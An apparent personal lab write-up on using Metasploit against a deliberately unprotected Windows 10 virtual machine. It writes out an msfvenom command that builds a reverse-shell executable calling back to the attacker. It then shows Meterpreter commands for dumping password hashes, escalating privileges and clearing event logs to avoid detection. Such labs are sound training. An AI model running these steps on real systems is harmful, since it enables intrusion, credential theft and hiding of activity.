<h1>Metasploit Penetration Test Lab</h1>
<img src=""/>
<p>In this lab, we utilize the Metasploit framework to exploit a vulnerable virtual machine to simulate a penetration test.</p>
<h2>Resources Used: </h2>
<p>- Kali Linux</p>
<p>- Metasploit</p>
<p>- Windows 10</p>
<p>- VMware Workstation Player</p>

<h2>Please note: this is for demonstration purposes only in a lab environment. Do not conduct these actions on any machines without clear permission.</h2>

<h2>1. Setting up Virtual Machines</h2>
<p>- This lab will require a virtual machine that runs Kali Linux, and another virtual machine that requires Windows 10. </p>
<p>- Head to VMWorksation Player and install it according to your actual physical machine (PICTURE Here)</p>
<img src=""/>
<p>- Once installed, download a Kali Linux ISO & Windows 10 ISO. We will use these files to let our virtual machine have the necessary operating system. Before you install, double-check the hash of the ISO to verify that it hasn’t been modified by anyone else other than the manufacturer.</p>
<p>- Launch VMWorkstation Player, and select “New”</p>
<p>- You can keep all of the default settings, but make sure to choose the correct OS, ISO file, and to make the Network type be bridged. Selecting “bridged” will allow both virtual machines to be on the same LAN as your physical machine. (PICTURE HERE) </p>
<img src=""/>
<p>- Once the configuration is complete, select "Launch/Play" on the Windows 10 machine, and complete the setup prompts. </p>
<p>- Once the setup is complete, go to the firewall settings and select off for all. This will be what makes the machine vulnerable in this lab environment. If this was a real penetration test, the firewall would most likely be turned on and it would take much more time and effort to try to find a vulnerability to exploit and gain access to the machine. </p>
<p>- Go to the command prompt and type in “ipconfig /all” and hit enter. Take note of what this VM's IP Address is and make sure it’s on the same subnet as your physical machine. (PICTURE HERE)</p>
<img src=""/>
<p>Select Start to run the Kali Linux virtual machine. You can select all of the defaults for the setup prompts. </p>

<h2>2. Configuring Metasploit</h2>
<p>- In the Kali Linux VM, select the logo on the top left, then scroll down to where it says “Exploitation Tools”. Select Metasploit to launch the terminal. (PICTURE HERE)</p>
<img src=""/>
<p>- It will ask for the password from the account you made for the VM, once entered Metasploit will start running its configuration.</p>
<p>- From here, you can explore many different exploits, payloads, stagers, & commands by using the “help” or “search” commands</p>
<p>- For this lab, we will be using the exploit called “exploit/multi/handler” which can be used for many different exploits in Metasploit</p>
<p>- Before we use this exploit, we need to get our payload onto the target system that will allow our exploit to be conducted successfully. </p>
<p>- In the msfconsole, type “msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP of Kali Linux machine> LPORT=4444 -f exe > thisismalicious.exe” and hit enter.(PICTURE HERE)</p>
<img src=""/>
<p>- This command creates our payload into an executable file, which we will send over to the Windows 10 VM. </p>
<p>- In this lab environment, simply copy the file & paste it on the Windows 10 VM since the VM’s firewall/security protections are disabled. In a real penetration test, you most likely will not be able to do this. There are many options you can take, such as social engineering, sending a phishing email, etc.</p>
<p>- Once the executable is on the Windows 10 VM, go back to the Kali Linux terminal and enter “use exploit/multi/handler”. This will create a session in Metasploit and allow us to configure the exploit before running it.</p>
<p>- Enter “show options”, in which you will see that the exploit needs an LHOST, which will be the Kali Linux IP. The LHOST is the listener machine that receives communication from the executable file/vulnerable machine. </p>
<p>Enter “set LHOST <Kali Linux IP>”. Enter “show options" again to see the updated configuration. (PICTURE HERE) </p>
<img src=""/>

<h2>3. Exploiting the Vulnerable Windows 10 VM</h2>
<p>- Go back to the Windows VM and double-click the executable file</p>
<p>- On the Kali Linux terminal, enter “run”. You should see that the exploit has executed successfully and you are now in a meterpreter shell!
(PICTURE HERE)</p>
<img src=""/>

<h2>4. Using Meterpreter</h2>
<p>- Meterpreter can be used for a variety of functions in the post-exploitation realm of penetration testing. We can use meterpreter to create persistence, find other vulnerabilities within the victim machine, download sensitive files, etc.</p>
<p>- For now, we can background this session by selecting “ctrl + z” on the keyboard or by typing in “background”.</p>
<p>- Now that we have a session on the victim VM, we can use “post/multi/recon/local_exploit_suggester” (PICTURE HERE)</p>
<img src=""/>
<p>- Set the session to whatever the session number is listed, and then enter "run"</p>
<p>- Once complete, there are multiple exploits that Metasploit found that the victim VM may be vulnerable to. We can use one of these to accomplish tasks that could be beneficial to the penetration test. (PICTURE)</p>
<img src=""/>
<p>- If we go back to our session, we can run a variety of commands to get a lot of information from the VM. “Hashdump” can collect all of the password hashes so that we can brute force them offline for example. (PICTURE)</p>
<img src=""/>
<p>- Try “getsystem” in the meterpreter shell. If successful, this will escalate our account’s privileges to the highest access, Authority. This will allow us to execute almost anything we want on the Windows VM. You can check the status of the account with “getuid”. (PICTURE)</p>
<img src=""/>
<p>- Feel free to play around with the commands in meterpreter to see what it can accomplish. </p>
<p>- Once you have accomplished your tasks in the penetration test, you can even remove the logs of what you have done in Event Viewer to avoid detection. In the meterpreter shell, enter "clearev". You should see in Event Viewer that the logs are not appearing for what actions you have performed within the VM. (PICTURE) </p>
<img src=""/>
<p>- There is a lot more to Metasploit, but this is just a very basic overview of what this powerful tool can accomplish in the penetration testing environment!</p>
